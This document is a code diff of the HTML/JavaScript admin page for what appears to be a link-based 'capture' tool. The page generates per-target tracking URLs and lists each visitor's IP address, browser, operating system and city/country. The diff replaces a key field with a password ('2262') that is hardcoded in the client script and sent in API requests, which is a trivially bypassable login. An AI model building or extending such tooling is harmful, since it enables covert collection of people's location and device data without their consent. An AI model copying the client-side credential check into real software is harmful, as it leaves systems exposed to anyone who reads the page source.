@@ -40,51 +40,65 @@
   .gen-row .copy-btn { background: #1a3a2a; border-color: #00ff88; }
   .gen-row .copy-btn:hover { background: #2a5a3a; }
   .link-tag { background: #2a1a1a; border-color: #ff6644; }
+  .login-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 80vh; }
+  .login-screen h1 { margin-bottom: 20px; }
+  .login-screen input { text-align: center; font-size: 1.2rem; padding: 12px 20px; width: 200px; }
+  .login-screen .error-msg { color: #ff5555; margin-top: 10px; font-size: 0.85rem; }
+  #dashboard { display: none; }
 </style>
 </head>
 <body>
-<div class="header">
-  <h1>// Capture Dashboard</h1>
-  <div class="controls">
-    <input type="password" id="keyInput" placeholder="Admin key" value="2262" />
-    <button onclick="loadData()">Refresh</button>
-    <button class="danger" onclick="clearData()">Clear All</button>
-  </div>
+<div id="loginScreen" class="login-screen">
+  <h1>// Admin Access</h1>
+  <input type="password" id="loginInput" placeholder="Enter password" onkeydown="if(event.key==='Enter')checkLogin()" autofocus />
+  <div style="margin-top:12px"><button onclick="checkLogin()">Unlock</button></div>
+  <div id="loginError" class="error-msg"></div>
 </div>
 
-<div class="generator" id="generator">
-  <h3>// URL Generator</h3>
-  <div class="gen-row">
-    <input type="text" id="linkName" placeholder="e.g. target1, lab3, win10-vm" onkeyup="generateUrl()" />
-    <button class="copy-btn" id="copyBtn" onclick="copyUrl()">Copy Link</button>
-    <button onclick="randomUrl()">Random</button>
+<div id="dashboard">
+  <div class="header">
+    <h1>// Capture Dashboard</h1>
+    <div class="controls">
+      <button onclick="loadData()">Refresh</button>
+      <button class="danger" onclick="clearData()">Clear All</button>
+    </div>
   </div>
-  <div class="gen-row" style="margin-top:8px">
-    <input type="text" id="generatedUrl" readonly placeholder="Generated URL will appear here" style="color:#00ff88;font-family:monospace" />
+  <div class="generator">
+    <h3>// URL Generator</h3>
+    <div class="gen-row">
+      <input type="text" id="linkName" placeholder="e.g. target1, lab3, win10-vm" onkeyup="generateUrl()" />
+      <button class="copy-btn" id="copyBtn" onclick="copyUrl()">Copy Link</button>
+      <button onclick="randomUrl()">Random</button>
+    </div>
+    <div class="gen-row" style="margin-top:8px">
+      <input type="text" id="generatedUrl" readonly placeholder="Generated URL will appear here" style="color:#00ff88;font-family:monospace" />
+    </div>
   </div>
+  <div id="stats" class="stats"></div>
+  <div id="content"><div class="loading">Loading...</div></div>
 </div>
-
-<div id="stats" class="stats"></div>
-<div id="content"><div class="loading">Enter admin key and click Refresh</div></div>
 
 <script>
-const KEY_STORAGE = 'capture_admin_key';
+const ADMIN_PASS = '2262';
 
-function getKey() {
-  let k = document.getElementById('keyInput').value;
-  if (!k) k = localStorage.getItem(KEY_STORAGE) || '';
-  return k;
+function checkLogin() {
+  const input = document.getElementById('loginInput');
+  const errEl = document.getElementById('loginError');
+  if (input.value === ADMIN_PASS) {
+    document.getElementById('loginScreen').style.display = 'none';
+    document.getElementById('dashboard').style.display = 'block';
+    loadData();
+  } else {
+    errEl.textContent = 'Wrong password';
+    input.value = '';
+    input.focus();
+  }
 }
 
 async function loadData() {
-  const key = getKey();
-  if (!key) { document.getElementById('content').innerHTML = '<div class="error">Enter admin key</div>'; return; }
-  localStorage.setItem(KEY_STORAGE, key);
-  document.getElementById('keyInput').value = key;
-
   document.getElementById('content').innerHTML = '<div class="loading">Loading...</div>';
   try {
-    const res = await fetch(`/api/captures?key=${encodeURIComponent(key)}`);
+    const res = await fetch(`/api/captures?key=${ADMIN_PASS}`);
     if (!res.ok) {
       let detail = '';
       try { const e = await res.json(); detail = e.detail || e.error || ''; } catch(e2) {}
@@ -99,14 +113,12 @@ async function loadData() {
 }
 
 async function clearData() {
-  const key = getKey();
-  if (!key) return;
   if (!confirm('Clear ALL captured data?')) return;
   try {
     const res = await fetch('/api/clear', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ key })
+      body: JSON.stringify({ key: ADMIN_PASS })
     });
     if (!res.ok) throw new Error('Clear failed');
     loadData();
@@ -116,30 +128,24 @@ async function clearData() {
 }
 
 function render(data) {
-  const statsEl = document.getElementById('stats');
-  statsEl.innerHTML = `<div class="stat">Total captures: <span>${data.total}</span></div>`;
-
+  document.getElementById('stats').innerHTML = `<div class="stat">Total captures: <span>${data.total}</span></div>`;
   const container = document.getElementById('content');
   if (data.total === 0) {
     container.innerHTML = '<div class="empty">No captures yet</div>';
     return;
   }
-
   container.innerHTML = data.captures.map(c => {
     const id = c.id || '?';
     const time = c.receivedAt || c.timestamp || '?';
     const ip = c.ip || '?';
-    const ua = (c.userAgent || c.userAgent || '').slice(0, 80);
+    const ua = (c.userAgent || '').slice(0, 80);
     const browser = c.userAgent || '';
     const os = getOS(browser);
     const loc = c.location ? `${c.location.city || ''}, ${c.location.country || ''}` : '';
-    const path = c.url ? new URL(c.url).pathname : '/';
-    const cleanPath = path === '/' ? '' : path;
     return `<div class="card">
       <div class="card-header">
         <span><span class="card-id">${id}</span> <span class="card-ip">${ip}</span></span>
         <span>
-          ${cleanPath ? `<span class="tag link-tag">${cleanPath}</span>` : ''}
           ${loc ? `<span class="tag">${loc}</span>` : ''}
           ${os ? `<span class="tag">${os}</span>` : ''}
           <span class="card-time">${new Date(time).toLocaleString()}</span>
@@ -174,15 +180,12 @@ function getBaseUrl() {
 
 function generateUrl() {
   const name = document.getElementById('linkName').value.trim();
-  const el = document.getElementById('generatedUrl');
-  if (!name) { el.value = ''; return; }
-  el.value = `${getBaseUrl()}/${encodeURIComponent(name.replace(/\s+/g, '-'))}`;
+  document.getElementById('generatedUrl').value = name ? `${getBaseUrl()}/?src=${encodeURIComponent(name.replace(/\s+/g, '-'))}` : '';
 }
 
 function randomUrl() {
   const words = ['target','vm','win','linux','mac','lab','pc','node','client','host'];
-  const r = words[Math.floor(Math.random()*words.length)] + Math.floor(Math.random()*999);
-  document.getElementById('linkName').value = r;
+  document.getElementById('linkName').value = words[Math.floor(Math.random()*words.length)] + Math.floor(Math.random()*999);
   generateUrl();
 }
 
@@ -190,19 +193,14 @@ function copyUrl() {
   const el = document.getElementById('generatedUrl');
   if (!el.value) return;
   navigator.clipboard.writeText(el.value).then(() => {
-    const btn = document.getElementById('copyBtn');
-    btn.textContent = 'Copied!';
-    setTimeout(() => { btn.textContent = 'Copy Link'; }, 1500);
+    document.getElementById('copyBtn').textContent = 'Copied!';
+    setTimeout(() => { document.getElementById('copyBtn').textContent = 'Copy Link'; }, 1500);
   });
 }
 
 document.getElementById('linkName').addEventListener('keydown', function(e) {
   if (e.key === 'Enter') copyUrl();
 });
-
-// Auto-load on page open
-document.getElementById('keyInput').value = '2262';
-loadData();
 </script>
 </body>
 </html>
